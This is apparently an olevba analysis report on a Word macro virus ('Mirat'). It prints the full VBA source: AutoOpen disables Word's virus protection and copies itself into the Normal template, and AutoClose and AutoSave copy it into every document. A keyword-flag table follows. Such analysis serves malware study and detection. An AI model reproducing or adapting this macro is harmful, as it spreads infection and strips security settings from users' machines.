olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Mirat-cb5969ffb2523d903e9f81c23a2ea7a67e102e76
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Mirat-cb5969ffb2523d903e9f81c23a2ea7a67e102e76 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Module1.bas 
in file: Virus.MSWord.Mirat-cb5969ffb2523d903e9f81c23a2ea7a67e102e76 - OLE stream: 'Macros/VBA/Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
/Module: MacRos
/-----------------------------------------------------------------------------------------------------\

Sub AutoOpen()
'Viruz: RaYnY_DaY by MI_pirat YoHoHo :)
'U are skrewed !
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "RD") <> "GotU" Then
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "RD") = "GotU"
'SecuritY Sucz
With Options
        .ConfirmConversions = False
        .UpdateLinksAtOpen = True
        .SendMailAttach = True
        .VirusProtection = False
        .AllowFastSave = True
        .BackgroundSave = True
        .CreateBackup = False
        .SavePropertiesPrompt = False
        .SaveInterval = 10
        .SaveNormalPrompt = False
    End With
     With ActiveDocument
        .ReadOnlyRecommended = False
        .SaveFormsData = False
     End With
Application.DefaultSaveFormat = ""
'So bye bye sec.
'Infection TimE
Set myTemplate = NormalTemplate
Application.OrganizerCopy Source:= _
ActiveDocument.FullName, Destination:= _
myTemplate.FullName, Name:= _
"MacRos", Object:=wdOrganizerObjectProjectItems
Documents.Open FileName:=NormalTemplate.FullName, ConfirmConversions:=False, ReadOnly _
        :=False, AddToRecentFiles:=False, PasswordDocument:="", PasswordTemplate _
        :="", Revert:=False, WritePasswordDocument:="", WritePasswordTemplate:="" _
        , Format:=wdOpenFormatAuto
ActiveDocument.Save
ActiveDocument.Close
Else
StatusBar = "HeHeHe"
End If
End Sub
Sub AutoClose()
'Guess What zis duz ?
For Each aVar In ActiveDocument.Variables
    If aVar.Name = "Infect" Then num = aVar.Index
Next aVar
If (num = 0) And (ActiveDocument.Name <> NormalTemplate.Name) Then
ActiveDocument.Variables.Add Name:="Infect"
ActiveDocument.Variables("Infect").Value = 1
Set myTemplate = ActiveDocument.AttachedTemplate
Application.OrganizerCopy Source:= _
myTemplate.FullName, Destination:= _
ActiveDocument.FullName, Name:="MacRos", Object:=wdOrganizerObjectProjectItems
ActiveDocument.Save
End If
End Sub
Sub AutoSave()
'Same ol' stuff
For Each aVar In ActiveDocument.Variables
    If aVar.Name = "Infect" Then num = aVar.Index
Next aVar
If (num = 0) And (ActiveDocument.Name <> NormalTemplate.Name) Then
ActiveDocument.Variables.Add Name:="Infect"
ActiveDocument.Variables("Infect").Value = 1
Set myTemplate = ActiveDocument.AttachedTemplate
Application.OrganizerCopy Source:= _
myTemplate.FullName, Destination:= _
ActiveDocument.FullName, Name:="MacRos", Object:=wdOrganizerObjectProjectItems
ActiveDocument.Save
End If
End Sub


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|.Variables          |May use Word Document Variables to store and |
|          |                    |hide data                                    |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

